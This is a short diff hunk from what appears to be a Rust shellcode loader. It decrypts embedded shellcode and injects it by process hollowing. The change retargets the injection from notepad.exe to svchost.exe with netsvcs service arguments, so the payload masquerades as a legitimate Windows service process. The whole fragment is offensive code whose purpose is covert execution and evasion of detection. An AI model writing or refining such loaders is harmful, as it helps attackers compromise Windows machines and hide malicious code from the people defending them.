@@ -68,7 +68,7 @@ fn main() {
 
     let buf = cipher.cbc_decrypt(&iv, &shellcode_encrypted[..]);
 
-    let exe_path = "C:\\Windows\\System32\\notepad.exe -k netsvcs -p".to_string();
+    let exe_path = "C:\\Windows\\System32\\svchost.exe -k netsvcs -p".to_string();
     let exe_options = Some("-k netsvcs -p".to_string());
     println!("Starting injection");
     match inject_hollow(exe_path, buf) {
